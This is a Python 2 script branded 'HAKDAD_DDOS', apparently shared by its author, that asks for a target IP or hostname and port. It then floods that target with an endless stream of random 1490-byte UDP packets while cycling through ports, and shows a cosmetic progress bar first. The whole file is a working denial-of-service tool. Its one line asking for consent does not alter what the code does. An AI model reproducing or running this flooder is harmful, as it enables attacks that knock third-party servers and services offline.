import sys
import os
import subprocess
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("clear")

app = ("install")
subprocess.call(["apt", "update"])

subprocess.call(["apt", app, "figlet"])


os.system("figlet HAKDAD_DDOS")
print
print "figlet Author           :   HAKDAD"
print "figlet YOUTUBE CHANNEL  :   HAKDAD"
print "figlet INSTAGRAM ID     :   Mr_kali_hacker_7723"
print
ip = raw_input("ENTER THE IP ADDRESS (or) Hostname of Target : ")
port = input("ENTER THE PORT                               : ")
time.sleep(3)
os.system("clear")
print "ATTACK HAS BEEN STARTED......HAVE..A..NICE..DAY.."
print "DON'T USE ON OTHERS WEBSITES WITHOUT MUTUAL CONSENT"
print "HAKDAD"
print "use control+c to stop the attack"
os.system("figlet Starting the attack...")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(4)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s with server hakdad"%(sent,ip,port)
     if port == 65534:
       port = 1
       
while False:
    print "please check you entered correct details"
